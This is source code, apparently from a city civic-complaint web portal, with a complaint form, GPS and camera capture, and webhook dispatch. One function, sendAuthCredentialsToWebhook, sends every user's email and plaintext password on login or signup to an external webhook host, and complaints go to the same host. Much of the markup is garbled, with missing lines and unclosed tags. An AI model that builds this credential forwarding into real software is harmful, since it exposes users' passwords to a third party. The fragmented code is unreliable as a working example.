    const TEST_WEBHOOK_URL = 'https://api.agents.snsihub.ai/webhook-test/3c4473e9-1031-48f3-aa85-ff94a756e06b';

    const getStoredWebhookConfig = () => {
      try {
        const s = localStorage.getItem('fmc_webhook_config');
        if (s) return JSON.parse(s);
      } catch (e) {}
      return { url: DEFAULT_WEBHOOK_URL, timeoutMs: 15000 };

    // Core Webhook Dispatcher: Sends POST requests and supports auto-fallback to test listener
    async function executeHttpPost(url, payload) {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 12000);

      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*'
          },
          body: JSON.stringify(payload),
          signal: controller.signal
        });
        clearTimeout(timeoutId);

        let data = null;
        const ct = res.headers.get('content-type') || '';
        if (ct.includes('application/json')) {
          try { data = await res.json(); } catch (e) { data = { text: 'JSON parse error' }; }
        } else {
          const text = await res.text();
          data = { text };
        }

        if (!res.ok) {
          let errText = `HTTP ${res.status} (${res.statusText || 'Error'})`;
          if (data?.error) errText = data.error;
          else if (data?.message) errText = data.message;
          const isInactive = res.status === 404 && (errText.includes('inactive') || errText.includes('not found') || data?.debug);

          return {
            success: false,
            status: res.status,
            error: errText,
            rawResponse: data,
            isInactiveWorkflow: isInactive,
            targetUrl: url,
            payload
          };
        }

        return {
          success: true,
          status: res.status,
          data,
          targetUrl: url,
          payload
        };
      } catch (err) {
        clearTimeout(timeoutId);
        return {
          success: false,
          status: 0,
          error: err.name === 'AbortError' ? 'Request timed out after 12s.' : (err.message || 'Network request failed'),
          targetUrl: url,
          payload,
          isNetworkError: true
        };
      }
    }

    // Sends payload to primary webhook, and if workflow is in test-mode (404), tries /webhook-test/
    async function dispatchWebhook(payload, customUrl = null) {
      const cfg = getStoredWebhookConfig();
      const primaryUrl = customUrl || cfg.url || DEFAULT_WEBHOOK_URL;

      const firstAttempt = await executeHttpPost(primaryUrl, payload);
      if (firstAttempt.success) return firstAttempt;

      // Smart fallback: If primary is 404 inactive and target is production /webhook/, try /webhook-test/
      if (firstAttempt.status === 404 && primaryUrl.includes('/webhook/')) {
        const testUrl = primaryUrl.replace('/webhook/', '/webhook-test/');
        const testAttempt = await executeHttpPost(testUrl, payload);
        if (testAttempt.success) {
          return {
            ...testAttempt,
            capturedByTestListener: true,
            note: 'Captured by active SNS Workbench test listener (/webhook-test/)'
          };
        }
      }

      return firstAttempt;
    }

    // Explicitly sends email ID and password to the webhook indicating whether it is login or new account
    async function sendAuthCredentialsToWebhook({ email, password, isNewAccount = false, action = null, name = '', location = '' }) {
      const eventLabel = isNewAccount ? 'new account' : 'login';
      const payload = {
        email: email ? email.trim().toLowerCase() : '',
        password: password || '',
        account_type: eventLabel,    // "login" or "new account"
        auth_event: eventLabel,      // "login" or "new account"
        type: eventLabel,            // "login" or "new account"
        action: action || eventLabel,
        is_new_account: Boolean(isNewAccount),
        description: isNewAccount ? 'New citizen account created' : 'User logged into existing account',
        name: name || '',
        location: location || '',
        submitted_at: new Date().toISOString()
      };
      return await dispatchWebhook(payload);
    }

    async function sendComplaintToWebhook(payload, customUrl = null) {
      return await dispatchWebhook(payload, customUrl);

                  <h4 className="font-bold text-slate-900 group-hover:text-[#123B63]">My Complaints</h4>

                  <h4 className="font-bold text-slate-900 group-hover:text-amber-600">Contact Support</h4>
                  <p className="text-xs text-slate-500 mt-1">24/7 Helpline 1913, ward office & emergency dispatch.</p>

            {/* Recent Complaints Preview */}

                        <p className="text-sm font-semibold text-slate-800 line-clamp-1">{item.complaint}</p>
                        <p className="text-xs text-slate-500 flex items-center gap-1 mt-1 truncate">
                          <Icons.MapPin size={12} className="text-[#2496D8] shrink-0" />
                          <span>{item.location}</span>
                        </p>
                      </div>
                    </div>

                    <div className="sm:text-right shrink-0 flex sm:flex-col justify-between items-center sm:items-end border-t sm:border-t-0 pt-2 sm:pt-0 border-slate-100">
                      <span className="text-[11px] text-slate-400">
                        {new Date(item.submitted_at).toLocaleDateString()}
                      </span>
                      <span className="text-xs font-semibold text-[#2496D8] flex items-center gap-1">
                        Track <Icons.ArrowRight size={12} />
                      </span>
                    </div>

                ))}
              </div>
            </div>

          {/* Support Helpline Modal */}
          {supportOpen && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm animate-fade-in text-xs">
              <div className="bg-white rounded-3xl shadow-xl max-w-md w-full p-6 animate-scale-up">
                <div className="flex justify-between items-center pb-3 border-b border-slate-100">
                  <h3 className="font-bold text-[#123B63] text-base">Municipal Emergency & Help</h3>
                  <button onClick={() => setSupportOpen(false)} className="text-slate-400 p-1"><Icons.X size={18} /></button>
                </div>
                <div className="py-4 space-y-2.5">
                  <div className="p-3 rounded-xl bg-slate-50 flex justify-between items-center">
                    <div>
                      <p className="font-bold text-slate-800">City Grievance Helpline</p>
                      <p className="text-[11px] text-slate-500">Potholes, lighting, sanitation</p>
                    </div>
                    <span className="font-mono font-bold text-[#2496D8] text-sm">1913</span>
                  </div>
                  <div className="p-3 rounded-xl bg-slate-50 flex justify-between items-center">
                    <div>
                      <p className="font-bold text-slate-800">Ward Councilor Office</p>
                      <p className="text-[11px] text-slate-500">Mon - Sat: 9 AM - 6 PM</p>
                    </div>
                    <span className="font-mono font-bold text-slate-700 text-sm">0422-2300000</span>
                  </div>
                  <div className="p-3 rounded-xl bg-rose-50 flex justify-between items-center text-rose-900">
                    <div>
                      <p className="font-bold">Emergency Police & Fire</p>
                      <p className="text-[11px]">Immediate hazards</p>
                    </div>
                    <span className="font-mono font-bold text-sm">112 / 100</span>
                  </div>

                <button onClick={() => setSupportOpen(false)} className="w-full py-2.5 rounded-xl bg-slate-100 font-bold text-slate-700">

    }

    // --- Page 4: Complaint Submission Form (Section 5 & 6) ---
    function ComplaintPage({ navigate, onOpenApiModal }) {
      const { user } = useContext(AuthContext);
      const { submitComplaint, submitting } = useContext(ComplaintContext);
      const { addToast } = useContext(NotificationContext);

      const fileInputRef = useRef(null);

      // Camera refs & state
      const videoRef = useRef(null);
      const canvasRef = useRef(null);
      const streamRef = useRef(null);
      const [showCamera, setShowCamera] = useState(false);
      const [cameraReady, setCameraReady] = useState(false);
      const [capturedFrame, setCapturedFrame] = useState(null);
      const [cameraError, setCameraError] = useState('');
      const [cameraStarting, setCameraStarting] = useState(false);

      // Form details required: NAME, LOCATION, EMAIL ID, IMAGE (IF REQUIRED), COMPLAINT, QUERIES AND REQUESTS
      const [formData, setFormData] = useState({
        name: user?.name || '',
        location: user?.location || '',
        email: user?.email || '',
        image: null,
        imageFileName: '',
        imageFileSize: '',
        complaint: '',
        queries_and_requests: '',
        category: 'Roads & Potholes'
      });

      const [errors, setErrors] = useState({});
      const [locating, setLocating] = useState(false);
      const [showConfirm, setShowConfirm] = useState(false);
      const [successModal, setSuccessModal] = useState(false);
      const [errorModal, setErrorModal] = useState(false);
      const [lastError, setLastError] = useState(null);
      const [submittedInfo, setSubmittedInfo] = useState(null);

      const validate = () => {
        const errs = {};
        if (!formData.name.trim()) errs.name = 'Please enter your full name.';
        if (!formData.location.trim()) errs.location = 'Please enter the problem location.';
        if (!formData.email.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
          errs.email = 'Please provide a valid email format.';
        }
        if (!formData.complaint.trim()) errs.complaint = 'Please describe the civic issue you are facing.';
        setErrors(errs);
        return Object.keys(errs).length === 0;
      };

      // Geolocation "Use My Location"
      const handleLocation = () => {
        if (!navigator.geolocation) {
          addToast({ title: 'Unsupported', message: 'Geolocation not supported by your browser.', type: 'warning' });
          return;
        }
        setLocating(true);
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const { latitude, longitude, accuracy } = pos.coords;
            const str = `${latitude.toFixed(5)}° N, ${longitude.toFixed(5)}° E (GPS accurate to ±${Math.round(accuracy)}m)`;
            setFormData(prev => ({ ...prev, location: prev.location ? `${prev.location} [${str}]` : str }));
            setLocating(false);
            addToast({ title: 'Location Attached', message: `GPS: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`, type: 'success' });
          },
          (err) => {
            setLocating(false);
            addToast({ title: 'Location Error', message: 'Unable to acquire location. Please type manually.', type: 'warning' });
          },
          { timeout: 8000 }
        );
      };

      // Image Upload with Preview & Base64
      const handleImage = (e) => {
        const file = e.target.files?.[0];
        if (!file) return;

        const validTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/webp'];
        if (!validTypes.includes(file.type.toLowerCase())) {
          addToast({ title: 'Invalid Image', message: 'Accepted formats: JPG, JPEG, PNG, WEBP.', type: 'error' });
          return;
        }
        if (file.size > 5 * 1024 * 1024) {
          addToast({ title: 'Image Too Large', message: 'Please upload an image smaller than 5MB.', type: 'warning' });
          return;
        }

        const sizeFormatted = (file.size / 1024).toFixed(1) + ' KB';
        const reader = new FileReader();
        reader.onloadend = () => {
          setFormData(prev => ({
            ...prev,
            image: reader.result,
            imageFileName: file.name,
            imageFileSize: sizeFormatted
          }));
          addToast({ title: 'Image Attached', message: `${file.name} ready for preview.`, type: 'info' });
        };
        reader.readAsDataURL(file);
      };

      const handleRemoveImage = () => {
        setFormData(prev => ({ ...prev, image: null, imageFileName: '', imageFileSize: '' }));
        if (fileInputRef.current) fileInputRef.current.value = '';
      };

      // ── Camera helpers ────────────────────────────────────────────────────────
      const stopStream = () => {
        if (streamRef.current) {
          streamRef.current.getTracks().forEach(t => t.stop());
          streamRef.current = null;
        }
      };

      const openCamera = async () => {
        setCameraError('');
        setCapturedFrame(null);
        setCameraReady(false);
        setCameraStarting(true);
        setShowCamera(true);

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          setCameraError('Camera API is not supported in your browser. Please use Chrome or Firefox.');
          setCameraStarting(false);
          return;
        }

        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
          });
          streamRef.current = stream;
          setCameraReady(true);
          setCameraStarting(false);
          // Attach to video element after render
          setTimeout(() => {
            if (videoRef.current) {
              videoRef.current.srcObject = stream;
              videoRef.current.play().catch(() => {});
            }
          }, 80);
        } catch (err) {
          setCameraStarting(false);
          if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
            setCameraError('Camera permission was denied. Please allow camera access in your browser settings and try again.');
          } else if (err.name === 'NotFoundError') {
            setCameraError('No camera was found on your device. Please upload an image instead.');
          } else {
            setCameraError(`Camera error: ${err.message || 'Unknown error'}`);
          }
        }
      };

      const capturePhoto = () => {
        if (!videoRef.current || !canvasRef.current) return;
        const video = videoRef.current;
        const canvas = canvasRef.current;
        canvas.width = video.videoWidth || 1280;
        canvas.height = video.videoHeight || 720;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
        setCapturedFrame(dataUrl);
      };

      const retakePhoto = () => {
        setCapturedFrame(null);
        // Re-attach stream to video
        setTimeout(() => {
          if (videoRef.current && streamRef.current) {
            videoRef.current.srcObject = streamRef.current;
            videoRef.current.play().catch(() => {});
          }
        }, 60);
      };

      const usePhoto = () => {
        if (!capturedFrame) return;
        const sizeKB = Math.round((capturedFrame.length * 3) / 4 / 1024);
        setFormData(prev => ({
          ...prev,
          image: capturedFrame,
          imageFileName: `camera_capture_${Date.now()}.jpg`,
          imageFileSize: `~${sizeKB} KB`
        }));
        addToast({ title: 'Photo Captured', message: 'Camera snapshot attached to your complaint.', type: 'success' });
        stopStream();
        setShowCamera(false);
        setCapturedFrame(null);
      };

      const closeCamera = () => {
        stopStream();
        setShowCamera(false);
        setCapturedFrame(null);
        setCameraReady(false);
        setCameraError('');
      };
      // ── End camera helpers ────────────────────────────────────────────────────

      const handlePreSubmit = (e) => {
        e.preventDefault();
        if (!validate()) {
          addToast({ title: 'Incomplete Form', message: 'Please fill in all mandatory fields.', type: 'warning' });
          return;
        }
        setShowConfirm(true);
      };

      const handleConfirmSubmit = async () => {
        const result = await submitComplaint(formData);
        setShowConfirm(false);

        if (result.success) {
          setSubmittedInfo(result.complaint);
          setSuccessModal(true);
          addToast({
            title: 'Grievance Dispatched',
            message: 'Your complaint has been successfully submitted to SNS Workbench!',
            type: 'success',
            duration: 6000
          });
          // Reset form after successful submission
          handleReset(false);
        } else {
          setLastError(result.apiResult);
          setSubmittedInfo(result.complaint);
          setErrorModal(true);
          addToast({
            title: 'Webhook Notice',
            message: result.apiResult?.error || 'SNS Workbench response notice. Form data preserved.',
            type: 'warning'
          });
        }
      };

      const handleReset = (ask = true) => {
        if (ask && !window.confirm('Clear form fields?')) return;
        setFormData({
          name: user?.name || '',
          location: user?.location || '',
          email: user?.email || '',
          image: null,
          imageFileName: '',
          imageFileSize: '',
          complaint: '',
          queries_and_requests: '',
          category: 'Roads & Potholes'
        });
        setErrors({});
        if (fileInputRef.current) fileInputRef.current.value = '';
      };

      const handleSaveLocalFallback = async () => {
        await submitComplaint(formData, true);
        setErrorModal(false);
        addToast({ title: 'Saved Locally', message: 'Archived to your My Complaints list.', type: 'info' });
        handleReset(false);
        navigate('/my-complaints');
      };

      return (
        <div className="min-h-screen bg-[#F5F7FA] py-10 px-4 sm:px-6 lg:px-8">
          <div className="max-w-4xl mx-auto">
            {/* Header */}
            <div className="bg-gradient-to-r from-[#123B63] to-[#1e5082] text-white p-6 sm:p-8 rounded-3xl shadow-lg mb-8">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <h1 className="text-2xl sm:text-3xl font-extrabold tracking-tight">Submit a Civic Complaint</h1>
                  <p className="mt-1 text-sm text-slate-200">
                    All submitted complaints are routed to the SNS Workbench municipal agent webhook.
                  </p>
                </div>
                <button
                  onClick={onOpenApiModal}
                  className="px-3.5 py-2 rounded-xl text-xs font-bold bg-white/10 hover:bg-white/20 text-white border border-white/20 shrink-0 flex items-center gap-1.5"
                >
                  <Icons.Settings size={14} />
                  <span>Webhook API</span>
                </button>
              </div>
            </div>

            {/* Form */}
            <div className="bg-white rounded-3xl p-6 sm:p-10 shadow-xl border border-slate-200">
              <form onSubmit={handlePreSubmit} className="space-y-6" noValidate>
                {/* Field 1: NAME & Field 3: EMAIL ID */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
                      NAME <span className="text-rose-500">*</span>
                    </label>
                    <div className="relative">
                      <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                        <Icons.User size={18} />
                      </div>
                      <input
                        type="text"
                        value={formData.name}
                        onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                        placeholder="Enter your full name"
                        className={`w-full pl-10 pr-3.5 py-3 rounded-xl border text-sm ${errors.name ? 'border-rose-400 bg-rose-50/20' : 'border-slate-300 bg-slate-50/50'} focus:ring-2 focus:ring-[#2496D8]`}
                      />
                    </div>
                    {errors.name && <p className="mt-1 text-xs text-rose-600">{errors.name}</p>}
                  </div>

                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
                      EMAIL ID <span className="text-rose-500">*</span>
                    </label>
                    <div className="relative">
                      <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                        <Icons.Mail size={18} />
                      </div>
                      <input
                        type="email"
                        value={formData.email}
                        onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                        placeholder="citizen@example.com"
                        className={`w-full pl-10 pr-3.5 py-3 rounded-xl border text-sm ${errors.email ? 'border-rose-400 bg-rose-50/20' : 'border-slate-300 bg-slate-50/50'} focus:ring-2 focus:ring-[#2496D8]`}
                      />
                    </div>
                    {errors.email && <p className="mt-1 text-xs text-rose-600">{errors.email}</p>}
                  </div>
                </div>

                {/* Field 2: LOCATION + Use My Location */}
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
                  <div className="sm:col-span-1">
                    <label className="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
                      Category
                    </label>
                    <select
                      value={formData.category}
                      onChange={(e) => setFormData({ ...formData, category: e.target.value })}
                      className="w-full px-3.5 py-3 rounded-xl border border-slate-300 text-sm font-medium bg-slate-50/50 focus:ring-2 focus:ring-[#2496D8]"
                    >
                      {COMMON_CATEGORIES.map(c => <option key={c} value={c}>{c}</option>)}
                    </select>
                  </div>

                  <div className="sm:col-span-2">
                    <div className="flex justify-between items-center mb-1.5">
                      <label className="block text-xs font-bold uppercase tracking-wider text-slate-700">
                        LOCATION <span className="text-rose-500">*</span>
                      </label>
                      <button
                        type="button"
                        onClick={handleLocation}
                        disabled={locating}
                        className="text-xs font-semibold text-[#2496D8] hover:text-[#123B63] flex items-center gap-1"
                      >
                        <Icons.Navigation size={13} className={locating ? 'animate-spin' : ''} />
                        <span>{locating ? 'Detecting GPS...' : 'Use My Location'}</span>
                      </button>
                    </div>
                    <div className="relative">
                      <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                        <Icons.MapPin size={18} />
                      </div>
                      <input
                        type="text"
                        value={formData.location}
                        onChange={(e) => setFormData({ ...formData, location: e.target.value })}
                        placeholder="Enter your city, area, street, or address"
                        className={`w-full pl-10 pr-3.5 py-3 rounded-xl border text-sm ${errors.location ? 'border-rose-400 bg-rose-50/20' : 'border-slate-300 bg-slate-50/50'} focus:ring-2 focus:ring-[#2496D8]`}
                      />
                    </div>
                    {errors.location && <p className="mt-1 text-xs text-rose-600">{errors.location}</p>}
                  </div>
                </div>

                {/* Field 4: IMAGE (IF REQUIRED) - Camera capture + file upload with preview */}
                <div>
                  <div className="flex justify-between items-center mb-1">
                    <label className="block text-xs font-bold uppercase tracking-wider text-slate-700">
                      IMAGE (IF REQUIRED)
                    </label>
                    <span className="text-xs text-slate-400">Optional • JPG, JPEG, PNG, WEBP</span>
                  </div>
                  <p className="text-xs text-slate-500 mb-3">
                    Capture a live photo with your camera or upload an existing image of the issue (optional).
                  </p>

                  <input
                    ref={fileInputRef}
                    type="file"
                    accept="image/jpeg,image/jpg,image/png,image/webp"
                    onChange={handleImage}
                    className="hidden"
                  />
                  {/* Hidden canvas for camera capture */}
                  <canvas ref={canvasRef} className="hidden" />

                  {!formData.image ? (
                    <div className="rounded-2xl border-2 border-dashed border-slate-300 bg-slate-50/50 overflow-hidden">
                      {/* Two action buttons */}
                      <div className="grid grid-cols-2 divide-x divide-slate-300">
                        <button
                          type="button"
                          onClick={openCamera}
                          className="flex flex-col items-center gap-2 py-7 px-4 hover:bg-sky-50 transition-colors group"
                        >
                          <span className="w-12 h-12 rounded-full bg-[#2496D8]/10 group-hover:bg-[#2496D8]/20 flex items-center justify-center transition-colors">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#2496D8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                              <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3z" />
                              <circle cx="12" cy="13" r="3" />
                            </svg>
                          </span>
                          <div className="text-center">
                            <p className="text-xs font-bold text-slate-800">Open Camera</p>
                            <p className="text-xs text-slate-400 mt-0.5">Capture a live photo</p>
                          </div>
                        </button>
                        <button
                          type="button"
                          onClick={() => fileInputRef.current?.click()}
                          className="flex flex-col items-center gap-2 py-7 px-4 hover:bg-emerald-50 transition-colors group"
                        >
                          <span className="w-12 h-12 rounded-full bg-[#2EAD72]/10 group-hover:bg-[#2EAD72]/20 flex items-center justify-center transition-colors">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#2EAD72" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                              <rect x="3" y="3" width="18" height="18" rx="2" ry="2" />
                              <circle cx="8.5" cy="8.5" r="1.5" />
                              <polyline points="21 15 16 10 5 21" />
                            </svg>
                          </span>
                          <div className="text-center">
                            <p className="text-xs font-bold text-slate-800">Upload from Gallery</p>
                            <p className="text-xs text-slate-400 mt-0.5">JPG, PNG, WEBP · Max 5MB</p>
                          </div>
                        </button>
                      </div>
                      <p className="text-center text-xs text-slate-400 py-2 border-t border-slate-200 bg-white/50">
                        📷 Capture or Upload Photo — optional field
                      </p>
                    </div>
                  ) : (
                    <div className="p-3 rounded-2xl border border-slate-200 bg-slate-50 flex flex-col sm:flex-row items-center gap-4">
                      <div className="relative shrink-0">
                        <img src={formData.image} alt="Preview" className="w-28 h-20 object-cover rounded-xl border border-slate-200 shadow" />
                        <span className="absolute -top-1.5 -right-1.5 bg-[#2EAD72] text-white text-[9px] font-bold px-1.5 py-0.5 rounded-full">
                          {formData.imageFileName?.startsWith('camera_') ? '📷 Camera' : '🖼 Gallery'}
                        </span>
                      </div>
                      <div className="flex-1 text-xs text-center sm:text-left">

                        <div className="mt-2 flex gap-2 justify-center sm:justify-start flex-wrap">
                          <button
                            type="button"
                            onClick={openCamera}
                            className="px-2.5 py-1 rounded-lg border border-[#2496D8]/30 bg-sky-50 font-semibold text-[#2496D8] text-xs flex items-center gap-1 hover:bg-sky-100"
                          >
                            <svg xmlns="http://www.w3.org/2000/svg" width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                              <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3z"/><circle cx="12" cy="13" r="3"/>
                            </svg>
                            Retake
                          </button>
                          <button
                            type="button"
                            onClick={() => fileInputRef.current?.click()}
                            className="px-2.5 py-1 rounded-lg border border-slate-300 bg-white font-semibold text-slate-700 text-xs hover:bg-slate-50"

                            Replace

                          <button
                            type="button"
                            onClick={handleRemoveImage}
                            className="px-2.5 py-1 rounded-lg bg-rose-50 text-rose-600 font-semibold text-xs hover:bg-rose-100"

                            Remove

                        </div>
                      </div>
                    </div>

                  {/* ── Camera Modal ─────────────────────────────────────────────── */}
                  {showCamera && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
                      <div className="bg-white rounded-3xl shadow-2xl w-full max-w-lg overflow-hidden">

                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                              <path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3z"/><circle cx="12" cy="13" r="3"/>
                            </svg>
                            <span className="font-bold text-sm">Capture Civic Issue Photo</span>
                          </div>
                          <button onClick={closeCamera} className="text-white/70 hover:text-white p-1 rounded-full hover:bg-white/10">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                              <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
                            </svg>
                          </button>
                        </div>

                        <div className="p-5">
                          {/* Error state */}
                          {cameraError && (
                            <div className="rounded-2xl bg-rose-50 border border-rose-200 p-4 text-center">
                              <div className="text-3xl mb-2">📵</div>
                              <p className="text-sm font-bold text-rose-700 mb-1">Camera Unavailable</p>
                              <p className="text-xs text-rose-600 mb-4">{cameraError}</p>
                              <button
                                onClick={() => fileInputRef.current?.click() || closeCamera()}
                                className="px-4 py-2 rounded-xl bg-[#2496D8] text-white text-xs font-bold hover:bg-[#1a7ab8] mr-2"
                              >
                                Upload Photo Instead
                              </button>
                              <button onClick={closeCamera} className="px-4 py-2 rounded-xl bg-slate-100 text-slate-700 text-xs font-bold hover:bg-slate-200">
                                Close
                              </button>
                            </div>
                          )}

                          {/* Starting spinner */}
                          {cameraStarting && !cameraError && (
                            <div className="flex flex-col items-center justify-center py-12 gap-3">
                              <div className="w-10 h-10 border-4 border-[#2496D8] border-t-transparent rounded-full animate-spin" />
                              <p className="text-sm text-slate-600 font-medium">Requesting camera access…</p>
                            </div>
                          )}

                          {cameraReady && !cameraError && (
                            <div>
                              {!capturedFrame ? (
                                <div>
                                  <div className="relative rounded-2xl overflow-hidden bg-black aspect-video mb-4 border-2 border-[#2496D8]/30">
                                    <video
                                      ref={videoRef}
                                      autoPlay
                                      playsInline
                                      muted
                                      className="w-full h-full object-cover"
                                    />
                                    {/* Viewfinder overlay */}
                                    <div className="absolute inset-0 pointer-events-none">
                                      <div className="absolute top-2 left-2 w-6 h-6 border-t-2 border-l-2 border-white/60 rounded-tl-sm" />
                                      <div className="absolute top-2 right-2 w-6 h-6 border-t-2 border-r-2 border-white/60 rounded-tr-sm" />
                                      <div className="absolute bottom-2 left-2 w-6 h-6 border-b-2 border-l-2 border-white/60 rounded-bl-sm" />
                                      <div className="absolute bottom-2 right-2 w-6 h-6 border-b-2 border-r-2 border-white/60 rounded-br-sm" />

                                  </div>
                                  <p className="text-xs text-slate-500 text-center mb-4">Point your camera at the civic issue and press <strong>Capture Photo</strong></p>
                                  <div className="flex gap-3 justify-center">
                                    <button
                                      type="button"
                                      onClick={capturePhoto}
                                      className="flex items-center gap-2 px-6 py-3 rounded-2xl bg-[#2496D8] text-white font-bold text-sm hover:bg-[#1a7ab8] shadow-lg shadow-sky-200 transition-all active:scale-95"

                                      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">

                                  <div className="flex items-center justify-center gap-2 mb-4">

                                      type="button"
                                      onClick={usePhoto}

                                        <polyline points="20 6 9 17 4 12"/>
                                      </svg>
                                      Use Photo
                                    </button>
                                    <button
                                      type="button"
                                      onClick={retakePhoto}
                                      className="flex items-center gap-2 px-4 py-3 rounded-2xl bg-slate-100 text-slate-700 font-semibold text-sm hover:bg-slate-200"
                                    >
                                      <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                                        <polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.51"/>
                                      </svg>
                                      Retake
                                    </button>
                                  </div>
                                </div>
                              )}
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  )}
                  {/* ── End Camera Modal ─────────────────────────────────────────── */}
                </div>

                {/* Field 5: COMPLAINT (Mandatory multiline textarea) */}
                <div>
                  <div className="flex justify-between items-center mb-1.5">
                    <label className="block text-xs font-bold uppercase tracking-wider text-slate-700">

                    </label>
                    <span className="text-xs text-slate-400">{formData.complaint.length} chars</span>
                  </div>
                  <textarea
                    rows={4}
                    value={formData.complaint}
                    onChange={(e) => setFormData({ ...formData, complaint: e.target.value })}
                    placeholder="Describe the civic issue you are facing."
                    className={`w-full p-3.5 rounded-xl border text-sm ${errors.complaint ? 'border-rose-400 bg-rose-50/20' : 'border-slate-300 bg-slate-50/50'} focus:ring-2 focus:ring-[#2496D8]`}

                {/* Field 6: QUERIES AND REQUESTS (Optional multiline textarea) */}

                    <label className="block text-xs font-bold uppercase tracking-wider text-slate-700">
                      QUERIES AND REQUESTS
                    </label>
                    <span className="text-xs text-slate-400">Optional</span>
                  </div>
                  <textarea
                    rows={3}
                    value={formData.queries_and_requests}
                    onChange={(e) => setFormData({ ...formData, queries_and_requests: e.target.value })}
                    placeholder="Enter any additional queries, suggestions, or requests."
                    className="w-full p-3.5 rounded-xl border border-slate-300 text-sm bg-slate-50/50 focus:ring-2 focus:ring-[#2496D8]"
                  />
                </div>

                {/* Form Buttons: Submit Complaint, Reset Form, Cancel */}
                <div className="pt-6 border-t border-slate-200 flex flex-col sm:flex-row items-center justify-between gap-3">
                  <button
                    type="button"
                    onClick={() => navigate('/home')}
                    className="px-5 py-2.5 rounded-xl text-xs font-bold text-slate-600 hover:bg-slate-100 order-3 sm:order-1"
                  >
                    Cancel
                  </button>
                  <div className="flex items-center gap-3 w-full sm:w-auto order-1 sm:order-2">
                    <button
                      type="button"
                      onClick={() => handleReset(true)}
                      disabled={submitting}
                      className="flex-1 sm:flex-none px-5 py-3 rounded-xl text-xs font-bold border border-slate-300 hover:bg-slate-50 text-slate-700"
                    >
                      Reset Form
                    </button>
                    <button
                      type="submit"
                      disabled={submitting}
                      className="flex-1 sm:flex-none px-8 py-3 rounded-xl text-sm font-bold bg-[#123B63] hover:bg-[#0d2b4a] text-white shadow-md flex items-center justify-center gap-2"
                    >
                      {submitting ? (
                        <>
                          <Icons.RefreshCw size={16} className="animate-spin" />
                          <span>Submitting...</span>
                        </>
                      ) : (
                        <>
                          <span>Submit Complaint</span>
                          <Icons.ArrowRight size={16} />
                        </>
                      )}
                    </button>
                  </div>
                </div>
              </form>
            </div>
          </div>

          {/* Confirmation Modal */}
          <ConfirmationModal
            isOpen={showConfirm}
            onClose={() => setShowConfirm(false)}
            onConfirm={handleConfirmSubmit}
            formData={formData}
            submitting={submitting}
          />

          {/* Success Dialog Modal (Section 6 Requirements) */}
          {successModal && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm animate-fade-in text-center">
              <div className="bg-white rounded-3xl shadow-2xl border border-slate-200 max-w-md w-full p-8 animate-scale-up">
                <div className="w-16 h-16 rounded-full bg-emerald-100 text-[#2EAD72] flex items-center justify-center mx-auto mb-4">
                  <Icons.CheckCircle2 size={36} />
                </div>
